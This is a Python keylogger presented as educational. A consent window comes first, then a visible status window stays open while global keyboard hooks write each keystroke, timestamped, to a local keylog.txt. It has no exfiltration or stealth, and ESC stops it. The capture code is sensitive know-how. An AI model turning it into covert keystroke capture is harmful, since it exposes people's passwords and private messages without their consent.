import keyboard
import logging
import time
from datetime import datetime
import tkinter as tk
from tkinter import messagebox
import threading

# Set up logging with more precise timestamps
logging.basicConfig(
    filename='keylog.txt',
    level=logging.INFO,
    format='%(asctime)s.%(msecs)03d: %(message)s',  # Added milliseconds
    datefmt='%Y-%m-%d %H:%M:%S'
)

class ImprovedKeylogger:
    def __init__(self):
        self.running = False
        self.keys = []
        self.start_time = None
        self.last_capture_time = None
        self.lock = threading.Lock()  # Thread safety
        self.create_consent_window()
        
    def create_consent_window(self):
        """Create a window to get user consent before starting."""
        self.root = tk.Tk()
        self.root.title("Keylogger Consent")
        self.root.geometry("500x400")
        self.root.config(bg="#f0f0f0")
        
        # Header
        header_frame = tk.Frame(self.root, bg="#3f51b5", pady=10)
        header_frame.pack(fill=tk.X)
        
        header_label = tk.Label(
            header_frame, 
            text="Educational Keylogger Consent", 
            fg="white", 
            bg="#3f51b5", 
            font=("Arial", 16, "bold")
        )
        header_label.pack()
        
        # Content
        content_frame = tk.Frame(self.root, bg="#f0f0f0", padx=20, pady=20)
        content_frame.pack(fill=tk.BOTH, expand=True)
        
        warning_label = tk.Label(
            content_frame,
            text="⚠️ IMPORTANT: ETHICAL WARNING ⚠️",
            fg="#d32f2f",
            bg="#f0f0f0",
            font=("Arial", 14, "bold")
        )
        warning_label.pack(pady=(0, 10))
        
        info_text = (
            "This is an educational keylogger program.\n\n"
            "By clicking 'Start Logging', you consent to having your keystrokes recorded "
            "to a file named 'keylog.txt' in the current directory.\n\n"
            "This program is for EDUCATIONAL PURPOSES ONLY.\n\n"
            "Using keyloggers on others without explicit consent is illegal "
            "and unethical in most jurisdictions.\n\n"
            "Press ESC at any time to stop the keylogger."
        )
        
        info_label = tk.Label(
            content_frame,
            text=info_text,
            fg="#212121",
            bg="#f0f0f0",
            font=("Arial", 11),
            justify=tk.LEFT,
            wraplength=460
        )
        info_label.pack(pady=10)
        
        # Get current username and date automatically
        current_time = datetime.now()
        formatted_date = current_time.strftime("%Y-%m-%d")
        username = "ashenamantha"  # Using the username from your output
        
        # User info
        user_frame = tk.Frame(content_frame, bg="#f0f0f0")
        user_frame.pack(fill=tk.X, pady=5)
        
        username_label = tk.Label(
            user_frame,
            text=f"User: {username}",
            fg="#212121",
            bg="#f0f0f0",
            font=("Arial", 10)
        )
        username_label.pack(side=tk.LEFT)
        
        date_label = tk.Label(
            user_frame,
            text=f"Date: {formatted_date}",
            fg="#212121",
            bg="#f0f0f0",
            font=("Arial", 10)
        )
        date_label.pack(side=tk.RIGHT)
        
        # Buttons
        button_frame = tk.Frame(content_frame, bg="#f0f0f0")
        button_frame.pack(pady=10)
        
        start_button = tk.Button(
            button_frame,
            text="Start Logging",
            command=self.start_logging,
            bg="#4caf50",
            fg="white",
            font=("Arial", 12),
            padx=15,
            pady=5
        )
        start_button.pack(side=tk.LEFT, padx=10)
        
        cancel_button = tk.Button(
            button_frame,
            text="Cancel",
            command=self.root.destroy,
            bg="#f44336",
            fg="white",
            font=("Arial", 12),
            padx=15,
            pady=5
        )
        cancel_button.pack(side=tk.LEFT, padx=10)
        
        self.root.mainloop()
    
    def create_status_window(self):
        """Create a small status window showing the keylogger is active."""
        self.status_window = tk.Toplevel()
        self.status_window.title("Keylogger Active")
        self.status_window.geometry("400x200")
        self.status_window.config(bg="#ffcdd2")  # Light red background as warning
        self.status_window.attributes('-topmost', True)
        
        warn_label = tk.Label(
            self.status_window,
            text="⚠️ KEYLOGGER ACTIVE ⚠️",
            fg="#d32f2f",
            bg="#ffcdd2",
            font=("Arial", 14, "bold")
        )
        warn_label.pack(pady=10)
        
        # Activity indicator
        self.status_var = tk.StringVar(value="Status: Idle")
        self.status_label = tk.Label(
            self.status_window,
            textvariable=self.status_var,
            fg="#212121",
            bg="#ffcdd2",
            font=("Arial", 12)
        )
        self.status_label.pack(pady=5)
        
        info_label = tk.Label(
            self.status_window,
            text="Press ESC key to stop logging",
            fg="#212121",
            bg="#ffcdd2",
            font=("Arial", 12)
        )
        info_label.pack(pady=5)
        
        stop_button = tk.Button(
            self.status_window,
            text="Stop Logging",
            command=self.stop_logging,
            bg="#f44336",
            fg="white",
            font=("Arial", 12),
            padx=15,
            pady=5
        )
        stop_button.pack(pady=10)
        
        # Handle window close event
        self.status_window.protocol("WM_DELETE_WINDOW", self.confirm_close)
        
        # Update status periodically
        self.update_status()
    
    def update_status(self):
        """Update the status window with capture information."""
        if not self.running:
            return
            
        if self.last_capture_time:
            time_diff = datetime.now() - self.last_capture_time
            if time_diff.total_seconds() < 5:
                self.status_var.set(f"Status: Active - Last capture {time_diff.total_seconds():.1f}s ago")
            else:
                self.status_var.set(f"Status: Waiting - No keypresses for {time_diff.total_seconds():.1f}s")
        
        # Schedule the next update
        if hasattr(self, 'status_window') and self.status_window.winfo_exists():
            self.status_window.after(500, self.update_status)  # Update every 500ms
    
    def confirm_close(self):
        """Confirm if user really wants to close the status window."""
        result = messagebox.askyesno(
            "Confirmation", 
            "Closing this window won't stop the keylogger.\n"
            "Do you want to stop logging and close?")
        if result:
            self.stop_logging()
    
    def on_key_press(self, event):
        """Callback function for keyboard press events."""
        with self.lock:
            # Update the last capture time for status updates
            self.last_capture_time = datetime.now()
            
            if event.name == 'esc':
                # Stop logging when ESC key is pressed
                self.stop_logging()
                return
            
            # Get appropriate key representation
            name = self.get_key_representation(event)
            
            # Log each key immediately to ensure real-time capture
            logging.info(name)
            
            # Force the log to be written to disk immediately
            for handler in logging.getLogger().handlers:
                handler.flush()
    
    def on_key_release(self, event):
        """Callback function for keyboard release events (for special keys)."""
        # We could add specific functionality for key release if needed
        pass
            
    def get_key_representation(self, event):
        """Convert key event to readable representation."""
        name = event.name
        
        # Handle special keys
        if len(name) > 1:
            if name == 'space':
                return ' '
            elif name == 'enter':
                return '[ENTER]\n'
            elif name == 'tab':
                return '[TAB]'
            elif name == 'backspace':
                return '[BACKSPACE]'
            elif name == 'delete':
                return '[DELETE]'
            elif name in ('shift', 'right shift', 'left shift'):
                return '[SHIFT]'
            elif name in ('ctrl', 'right ctrl', 'left ctrl'):
                return '[CTRL]'
            elif name in ('alt', 'right alt', 'left alt'):
                return '[ALT]'
            elif name == 'left windows':
                return '[LEFT WINDOWS]'
            elif name == 'right windows':
                return '[RIGHT WINDOWS]'
            else:
                return f'[{name.upper()}]'
        return name
    
    def start_logging(self):
        """Start the keylogger with visible notification."""
        self.root.destroy()
        self.create_status_window()
        
        # Record start time and log it
        self.start_time = datetime.now()
        self.last_capture_time = self.start_time
        username = "ashenamantha"  # Using the username from your output
        logging.info(f"=== Keylogging started by user: {username} ===")
        
        # Force flush to ensure the start message is written immediately
        for handler in logging.getLogger().handlers:
            handler.flush()
        
        # Start recording keystrokes - use both press and release for better capture
        self.running = True
        keyboard.on_press(callback=self.on_key_press)
        keyboard.on_release(callback=self.on_key_release)
        
        # Keep the status window open
        self.status_window.mainloop()
    
    def stop_logging(self):
        """Stop the keylogger and show summary."""
        if self.running:
            # Stop the keyboard listeners
            keyboard.unhook_all()
            
            # Log end time
            end_time = datetime.now()
            duration = end_time - self.start_time
            logging.info(f"=== Keylogging stopped. Duration: {duration} ===")
            
            # Force flush to ensure the end message is written immediately
            for handler in logging.getLogger().handlers:
                handler.flush()
            
            # Show summary
            if hasattr(self, 'status_window') and self.status_window.winfo_exists():
                self.status_window.destroy()
                
            messagebox.showinfo(
                "Keylogger Stopped", 
                f"Keylogging has stopped.\nDuration: {duration.total_seconds():.2f} seconds\nLogs saved to 'keylog.txt'"
            )
            
            self.running = False

if __name__ == "__main__":
    keylogger = ImprovedKeylogger()